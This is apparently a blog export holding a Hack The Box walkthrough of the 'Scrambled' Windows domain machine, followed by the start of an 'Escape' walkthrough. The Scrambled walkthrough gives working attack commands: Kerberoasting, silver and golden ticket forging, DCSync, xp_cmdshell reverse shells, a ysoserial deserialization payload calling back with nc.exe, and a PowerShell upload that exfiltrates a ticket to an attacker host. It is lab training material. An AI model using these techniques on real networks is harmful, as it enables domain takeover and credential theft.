~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic Nothing of particular note. Discovering their was breach \u0026amp; NTLM authentication is disabled: Navigating to the support.html page we can see the below alert: It says that they were breached and now all NTLM authentication has been disabled. Interesting. Discovering Password Resets Cause Password to Be Set As Username: Enumerating the site further we find the page passwords.html where it says the below:\nOur self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.\nMeaning there is a good chance that a users password is their username, I have already tried this with SMB, but have not tried other services. +Note+: It turned out this was the way forward however something was up with my box, so had to reset. I save the full email addresses to a list and try password spraying with them as the password as well as thes shortened username, but get no hits.\nDiscovering that ksimpson is most likely part of IT/Support: ksimpson in screenshot: Looking at the page supportrequest.html it details a process for providing network information \u0026amp; there is a screenshot which has ksimpson as the user: I believe we can safely assume that ksimpson is part of IT/Support in some capacity as they most likely made this screenshot. (This may not seem like much put could be a valauble target to go after later) Sales Order App: On the page salesorder.html find the following content: It shows that they have their own custom app running (which was expected given NMAP\u0026rsquo;s output) \u0026amp; that it\u0026rsquo;s possible to enable debug logging. We don\u0026rsquo;t have access to this app as far as I can see at the moment but this is good information. MSSQL 1433: I try cred stuff using netexec with mssql option, but it fails. (Stay tuned to find out why later) ScrambleCorp Order Service 4411: From our NMAP scan it says: 4411/tcp open found? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3; |_ ERROR_UNKNOWN_COMMAND; Using nc to connect to port 4411: Finding SCRAMBLECORP_ORDERS_V1.0.3;\nI use nc to connect to the service running on 4411 nc $box 4411 It tells me that there is a service called SCRAMBLECORP_ORDERS_V1.0.3 running on the service (we knew this from the NMAP scan). What\u0026rsquo;s most interesting to me is that the banner \u0026amp; and the responses are all followed by a semi-colon ; this is what usually follows an SQL/MSSQL statement. In the NMAP we can also see near the end it says ms-sql-s, oracle-tns: I try entering oracle-sql queries:\nSELECT * FROM v$version; No luck lets come back to this later. 2. Authenticated Enumeration: Realizing the mistake I made when enumerating: After alot of enumeration, and some strange results from netexec and some other tools it dawned on me, all of my checks have been with netexec and SMB….which used NTLM….I need to try and connect to the service using kerberos if possible. I need to cred stuff using usernames as passwords but authenticating using kerberos. Connecting to the SMB shares as ksimpson: As we cannot use NTLM authentication we have to force kerberos authentication. This is possible by passing most programs the -k flag, however most tools expect to be fed a .cacche authentication file by way fo the KRB5CCNAME variable in linux. So we have to somehow create a .cacche file or pass the creds directly on the CLI and have kerberos authenticate using them. I do some digging and I cannot find direct way to craft my own .cacche file. So instead I look to tools I can try and force into using CLI fed creds but authenticate using the kerberos protocol. Trying to force netexec to use kerberos authentication: I try on netexec by passing the -k flag, but it does not work: I try multiple methods but none work.\nnetexec smb $box -k netexec smb $box -u ksimpson -k netexec smb $box -u ksimpson -p ksimpson -k +Note+: I am using ksimpson as it just kinda feels like the move, with how much we have seen that username so far. Back to the drawing board.\nTrying to force smbmap to use kerberos authentication: I try to connect this time with smbmap and it\u0026rsquo;s the same issue: smbmap -u $user -H $box -k Trying to force smbclient to use kerberos authentication: Big ol\u0026rsquo; *miss here:\nsmbclient -U $domain\\$user \\\\\\\\$box\\\\ -k It appears that netexec \u0026amp; smbmap expects a .ccache to provided via the KRB5CCNAME variable, and will not try the provided creds for kerberos authentication.\nUsing impacket-smbclient to authenticate to the SMB Share using kerberos: I look through the list of tools I use and what\u0026rsquo;s left, my precious impacket-smbclient: impacket-smbclient $domain/$user:$user@dc1.$domain -k IT CONNECTS!!!! Finding a file called Network Security Changes.pdf: Finding the .pdf:\nWhilst enumerating the shares I find a file called Network Security Changes.pdf in the Public share: I download the .pdf:\nget Network Security Changes.pdf I check all other shares but I am denied access:\nOpening Network Security Changes.pdf: Strange text…hmmm?\nWhen I initially open the file there is only a small amount of text. Poor obfuscation attempted:\nI press CTRL+A to select all text and can see that they have just made the text white. I use pdftotext to convert the file to a .txt file:\npdftotext *.pdf I also try and connect to smb as the other users: I check if any other users can connect to SMB via kerberos but they cannot See, this is why using variables is so much easier, change on var $user and you can just repeat all your tasks. Reading Network Security Changes.pdf: Once converted I open it up and find the following: Key Points: They were compromised via an NTLM Relaying attack which is why they deactivated NTLM authentication \u0026amp; are under the impression Kerberos is more secure. When accessing resources we need to specify the full server name and CN name of the user. e.g. ksimpson.scrm.local instead of just the SAM name of ksimpson: We discovered this in our SMB connection. There are creds stored in their SQL HR Database however this has now been restricted. Attempting to extract creator names from the .PDF: If you are not aware, it is sometimes possible to extract valid domain usernames from pdf's if they have been created on a Windows host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was created using Word 2010: Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it’s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Trying to Connect to MSSQL using impacket-mssql: I attempt to connect as all the users I have found so far: impacket-mssqlclient $domain/$user:$user@dc1.$domain -k What is interesting though is the response for the user ksimpson is different from all other users: [-] ERROR(DC1): Line 1: Login failed for user 'SCRM\\ksimpson'. Which leads me to believe they may have access however I just need to find a password for them. Kerberoasting using Kerberos Credentials to Get More Kerberos Credentials: As we have valid credentials we can use impackets suite of tools to further enumerate and exploit the target. Using impacket-GetUsersSPNs to extract the SQL service Kerberos Tickets: Kerberoasting with impacket-GetUserSPNs: impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -outputfile scrmtickets We get a hit \u0026amp; get the sqlsvc ticket: Cracking the sqlsvc hashes with hashcat: I pass the hashes into hashcats: hashcat -m 13100 scrmtickets ~/Wordlists/rockyou.txt It cracks almost immediately \u0026amp; now we have a creds for mssql Trying to connect to the MSSQL Service: I try various ways with impacket-mssqlclient to connect with the password and it does not work.\nRe-exporting the tickets as .ccache file:\nimpacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -save I then re-export the tickets but this time as a .ccache file by passing the -save flag. I load it into the KRB5CCNAME variable:\nHowever it doesn\u0026rsquo;t work either. I think this is due it saying in the pdf that only domain admins have access to the she SQL server. I\u0026rsquo;ve got a SilverTicket maybe… As I have the service password if I can get the domain SID and the NTML hash of the sqlsvc password I should be able to craft a silver ticket using impacket-ticketer: Generate NTLM Hash of sqlsvc user: Looking online I find the https://codebeautify.org/ntlm-hash-generator where we can just enter the password and it will generate an NTLM hash. However I want to be able to do this when I don\u0026rsquo;t have access to that website.\nI find this post from 2012: https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html Shell Code to convert clear-text password to NTLM hash:\niconv -f ASCII -t UTF-16LE \u0026lt;(printf \u0026quot;\u0026lt;Password\u0026gt;\u0026quot;) | openssl dgst -md4 I verify it matches using the online tool: +Note+: The only reason I do this check as this is the first time I have used this code so need to ensure it works and the hashes match, moving forward I now know I can use this code and it will work. Python Code to Create NTLM hash from clear text creds:\nIronically when I went to add the shell code above to my notes. I found an entry where I had done this previously using python. Below is the python code to do so:\nInstall the passlib first pip install passlib from passlib.hash import nthash password = input(\u0026#34;Put your clear text password here: \u0026#34;) nt_hash = nthash.hash(password) print(nt_hash) Extracting the Domain SID using impacket-getPac: We can use impacket-getPac to easily extract the DomainSID: impacket-getPac $domain/$user -targetUser administrator -hashes :$hash DomainSID: S-1-5-21-2743207045-1827831105-2542523200 +Note+: PAC\u0026rsquo;s are pretty interesting, see below for more information. What is a Privilege Attribute Certificate (PAC): Definition:\nA Privilege Attribute Certificate (PAC) is a data structure used in Microsoft\u0026rsquo;s Kerberos implementation to store authorization information about a user. The PAC is a Microsoft-specific extension to the Kerberos protocol, documented in MS-PAC specification . Components of a PAC:\nUser Security Identifiers (SIDs):\nContains the SID of the user, which is a unique identifier that represents the user in Windows. Includes both the user\u0026rsquo;s primary SID and any additional SIDs. Group Memberships::\nLists the groups to which the user belongs, used for determining access to resources. Contains both domain and local group memberships. Includes Resource Groups and Claims information. Privilege Information:\nContains the privileges assigned to the user (e.g., whether the user has administrative rights). Stores User Account Control (UAC) flags. Lists specific Windows privileges (e.g., SeBackupPrivilege, SeDebugPrivilege). Logon Information:\nIncludes logon time, logon count, and other session-specific data. Contains the user\u0026rsquo;s profile path and home directory. Stores the user\u0026rsquo;s logon script path. Records the logon server and domain. Creating the silver ticket with impacket-ticketer: As we have all the necessary parts, domain SID, password \u0026amp; NTLM hash we should be able to craft a kerberos silver ticket. I use impacket-ticketer to make the silver ticket: impacket-ticketer -nthash $hash -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain $domain -dc-ip dc1.$domain -spn MSSQLSvc/dc1.scrm.local:1433 administrator As you can see there are some errors, however it still creates the administrator.ccache Using the silver ticket to access the SQL instance: I load the ticket into the KRB5CCNAME variable\nexport KRB5CCNAME=./administrator.ccache I check the ticket is loaded with klist:\nklist I access the host using impacket-mssqlclient:\nimpacket-mssqlclient dc1.$domain -k 3. Foothold: Activating xp_cmdshell on the host to enumerate the underlying host system: As soon as I connect I see if I can activate xp_cmdshell:\nenable_xp_cmdshell It works which means we now have remote code execution on the host itself. I check my privs:\nxp_cmdshell whoami /priv I enumerate the host \u0026amp; the website directory:\nI try and read the logs and history files but do not have the correct perms: I also check the users home folders but I can only access my own and there is nothng of note:\nI try and enumerate the shares but I don\u0026rsquo;t have access there either:\nGetting a reverse shell as sqlsvc: As we have remote code execution we can trigger a reverse shell on the host: I create a revere shell with https://revshells.com I start my listener:\nnc -nvlp 443 I use xp_cmdshell to execute my shell:\nxp_cmdshell powershell -e \u0026lt;base64EncodedString\u0026gt; Shell Caught:\nEnumeration dead-end:\nI do some further enumeration however it is a dead-end…as far as I can see. Enumerating the Database \u0026amp; Finding Creds for MiscSvc: As was mentioned in the PDF we read earlier, the previous attackers were able to compromise the domain after gaining access to the HR database.\nI enumerate the databases:\nenum db We can see the HR db is listed. I select the database:\nuse ScrambleHR I list it\u0026rsquo;s tables \u0026amp; find an interesting table called: UserImport:\nselect * from ScrambleHR.INFORMATION_SCHEMA.TABLES I list the contents of it to find the LdapPwd of the MiscSvc account:\nselect * from UserImport I list the contents of the other shares but they are empty:\n4. Lateral Movement: Getting a shell as MiscSvc: As I have credentials it dawned on me I can most likely invoke a ps-session using the creds of MiscSvc once I have an established session…..right?\nAnd here\u0026rsquo;s what didnt\u0026rsquo; work: I re-connect my reverse shell like I did with the sqlsvc account using xp_cmdshell:\nI try and invoke a ps-session * but it does not work*:\nenter-pssession -computername localhost -Credential miscsvc@scrm.local enter-pssession -computername dc1.scrm.local -Credential miscsvc@scrm.local Let\u0026rsquo;s try runas:\nrunas /user:miscsvc \u0026quot;powershell\u0026quot; It looks like it will work as it prompts for the password but then doesn\u0026rsquo;t let me enter it. Lets try PWSH (Powershell for linux):\nenter-pssession -computername dc1.scrm.local -Credential miscsvc@scrm.local Again it doesn\u0026rsquo;t work but tells us this is due to wsman not being installed, so let\u0026rsquo;s install it. Installing PSWSMan \u0026amp; WSMan:\nAfter trying various different spellings etc I did some googling:\nInstall-Module -Name PSWSMan Install-WSMan Exit Still no dice it will fail consistently:\nHere is what did work Good Ol\u0026rsquo; ….Secure….Invoke: We can pass a secure string \u0026amp; then invoke a command as the user miscsvc using the credentialed: From the nc reverse shell we established as sqlsvc we can run the following commands. $SecPassword = ConvertTo-SecureString '\u0026lt;Pass\u0026gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\\MiscSvc', $SecPassword) Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { \u0026lt;CommmandToRun\u0026gt; } Getting our reverse shell as MiscSvc: I generate another reverse shell from https://revshells.com :\nStart another listener:\nnc -nlvp 9999 Paste in my command:\nShell Caught:\nOther than the flag there is not much on here….\nHere\u0026rsquo;s a breakdown of why this works Code Explanation: Convert password to a secure string:\n$SecPassword = ConvertTo-SecureString '\u0026lt;Password\u0026gt;' -AsPlainText -Force ConvertTo-SecureString: Converts a plain text string '\u0026lt;Password\u0026gt;') into a secure string. -AsPlainText: This flag tells PowerShell that the input is plain text (non-secure). -Force: Suppresses warnings/errors and forces the command to accept plain text input. Result: The password is stored as an encrypted SecureString in the $SecPassword variable. Create a credential object:\n$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\\MiscSvc', $SecPassword) New-Object System.Management.Automation.PSCredential: This creates a new credential object, combining a username and the secure password. 'scrm.local\\MiscSvc': The username is 'scrm.local\\MiscSvc'. $SecPassword: The password (in secure string format) is passed to the credential object. Result: The $Cred object contains the username and encrypted password. Invoke-Command to execute a script block on a target machine:\nInvoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami } Invoke-Command: Executes the specified script block { whoami } on a remote computer. -Computer 127.0.0.1: Target machine is 127.0.0.1 (the local machine). As we want to authorize with creds we have for the local machine. -Credential $Cred: Specifies the credentials to use (`$Cred`, the object created above). -ScriptBlock { whoami }: The script block to be executed on the target machine. +Note+: Any command can be placed here, like our reverse shell Summary: Converts a plain text password to a secure string. Creates a credential object. Executes a command on the local machine using the specified credentials. Enumerating SMB shares as miscsvc I connect to the SMB shares as miscsvc using the impacket-smbclient\nimpacket-smbclient $domain/$user:$pass@dc1.$domain -k I have access to the IT share:\nWe access 3 folder: Apps Logs Reports I check the Apps folder \u0026amp; find a copy of their sales application ScrambleClient.exe \u0026amp; .dll:\nI download both: I check the other folders but they are empty. I quickly check if we have acess to any other shares: So far we don\u0026rsquo;t. Using the ScrambledClient.exe: I transfer the ScrambledClient.exe to my Windows VM \u0026amp; connect to the HTB VPN:\nI edit my hosts file to have the same entries as my linux host:\n.\\notepad.exe C:\\Windows\\System32\\drivers\\etc\\hosts I enable debugging like it said on the intranet page \u0026amp; try and connect:\nI try both this user and sqlsvc but neither work. Discovering the credential format the program expects by reading the log file:\nThis is interesting as we now know the format that the program expects credentials in. LOGON;\u0026lt;username\u0026gt;|\u0026lt;password\u0026gt; I try all known usernames and passwords I have but no hits:\nFinding a login bypass by Examining the ScrambleLib.dll in DNSpy: DLL\u0026rsquo;s can hold a lot of valuable information so they are worth examining with tools like DNSpy :\nI open up DNSpy in my Windows VM:\nIf don\u0026rsquo;t have it already you can easily download it here: https://github.com/dnSpy/dnSpy/releases I open up the DLL and find an authentication bypass:\nAs you can see below the code says: if (string.Compare(Username, \u0026#34;scrmdev\u0026#34;, true) == 0) { Log.Write(\u0026#34;Developer logon bypass used\u0026#34;); result = true; } else this basically says if we enter scrmdev as the user we will be logged in without having to enter a password 5. Privilege Escalation: Logging into ScrambledClient.exe using scrmdev creds: I connect with the creds:\nI\u0026rsquo;m in.\nTest order:\nExamining how serialized data is sent via ScrambledClient.exe: Checking Debug Log: We can see the data is being serialized (converted) to base64 I decode the Base64 data in kali to see if there is anything valuable being sent echo \u0026quot;\u0026lt;base64string\u0026gt;\u0026quot; | base64 -d I try SQL injection incase there is a way to leak information from the underlying database, however it doesn\u0026rsquo;t work:\nBefore each upload the string Binary formatter init successful is listed:\nLooking online I find this article from microsoft regarding how BinaryFormatter is now obsolete due to security vulnerabilites: 6. Ownership: Crafting a Payload with yoserial.net \u0026amp; catching a system shell: I do some quick searching and find ysoserial.net :\nInitially I try and use a simple base64 encoded powershell reverse shell but it spits out a bunch of errors:\n.\\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c \u0026quot;\u0026lt;CommandToRun\u0026gt;\u0026quot; I figure it could be a length exception so I transfer nc.exe to the C:\\Temp folder for ease. Well that doesn\u0026rsquo;t work either, so suppose we need to troubleshoot and fix this:\n.\\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c \u0026quot;\u0026lt;CommandToRun\u0026gt;\u0026quot; After some digging I found that 1.35 works fine where as 1.36 has other deps:\n+Important Note+: Use Release 1.35 +not+ 1.36 I generate my payload using yoserial.net v1.35:\nysoserial-1.35\\Release\u0026gt; .\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;C:\\Temp\\nc.exe 10.10.14.31 443 -e cmd\u0026quot; Use the same syntax the program uses to upload it:\nUPLOAD_ORDER;\u0026lt;base64string\u0026gt; We can see it errors out, but that\u0026rsquo;s fine. Catch my system shell:\nGet root flag:\n7. Persistence: Creating A Golden Ticket with mimikatz: I upload mimikatz via my python webserver:\nI perform a dcsync attack and dump the krbtgt hash:\nlsadump::dcsync /user:krbtgt /domain:scrm.local I forge a golden ticket using the Domain-SID \u0026amp; krbtgt hash: kerberos::golden /domain:scrm.local /user:Administrator /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:\u0026lt;HASH\u0026gt; The ticket is is present: Transferring the Golden Ticket Using my custom python webserver: Start my custom python webserver:\nI have this handy python webserver that is useful when exfiling data. Save as pythonServer.py Rung python3 pythonServer.py from http.server import SimpleHTTPRequestHandler, HTTPServer class SimpleHTTPUploadHandler(SimpleHTTPRequestHandler): def do_POST(self): length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) field_data = self.rfile.read(length) #If you prefer change the file to be whatever you want with open(\u0026#39;uploaded_file\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(field_data) self.send_response(200) self.end_headers() self.wfile.write(b\u0026#39;File uploaded successfully\u0026#39;) # You can set the port to be 443 etc so it looks more legitimate. def run(server_class=HTTPServer, handler_class=SimpleHTTPUploadHandler, port=9000): server_address = (\u0026#39;\u0026#39;, port) httpd = server_class(server_address, handler_class) print(f\u0026#34;Starting httpd server on port {port}\u0026#34;) httpd.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: run() +NOTE+: Will output file as uploaded_file Send the ticket from victim using powershell:\nfilePath = \u0026#34;C:\\Temp\\ticket.kirbi\u0026#34;; $url = \u0026#34;http://10.10.14.31:9000\u0026#34;; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $webClient = New-Object System.Net.WebClient; $webClient.UploadData($url, $fileBytes) Ticket received on our attack host: +Note+: The file will be called uploaded_file you will have to change it back to \u0026lt;file\u0026gt;.kirbi Convert with impacket-ticketconverter:\nimpacket-ticketConverter ticket.kirbi admin.ccache Import into session my current session:\nexport KRB5CCNAME=./admin.ccache Check ticket is loaded into memory:\nklist Fire up impacket-psexec and connect:\nWe have persistence. Lessons Learned: What did I learn? I learned about using pure kerberos authentication when NTLM is disabled (not to sure how useful this will be in real life but it was a fun exercise) I learned ALOT about deserialization attacks. I learned more about deconstructing DLL\u0026rsquo;s with DNSPy, that is fun. What silly mistakes did I make? Spent too long trying to use tools that utilize NTLM (netexec) for enumeration. See point 1, got caught out a few times. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/scrambled-box\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/escape-box\/": {
        "title": "Escape HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","MSSQL","MYSQL","CA","Certificate","ESC1",],
        "content": "Escape Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/%3CBoxName%3E How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  08:21:02 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST Nmap scan report for 10.129.228.253 Host is up (0.042s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds Some interesting enumeration paths already: 53 - DNS: We can check for interesting records: 88 - Kerberos: We can use kerbrute to bruteforce users using pre-auth. 445 - Good ol\u0026rsquo; smb: We can check for null sessions. 389 - LDAP: We can check for anonymous binds and enumerate the domain. 1443 - MSSQL: A good target in general to go after. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 12s  08:21:23 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST Nmap scan report for 10.129.228.253 Host is up (0.038s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 15:24:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | 10.129.228.253:1433: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 | ms-sql-info: | 10.129.228.253:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-04T15:17:39 |_Not valid after: 2054-10-04T15:17:39 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49669/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49694/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 49722/tcp open msrpc Microsoft Windows RPC 49743/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-04T15:25:11 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 242.11 seconds LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools  v3.12.6 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  08:22:05 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.228.253 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=sequel,DC=htb CN=Configuration,DC=sequel,DC=htb CN=Schema,CN=Configuration,DC=sequel,DC=htb DC=DomainDnsZones,DC=sequel,DC=htb DC=ForestDnsZones,DC=sequel,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=sequel,DC=htb ldapServiceName: sequel.htb:dc$@SEQUEL.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: That any host os can used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming 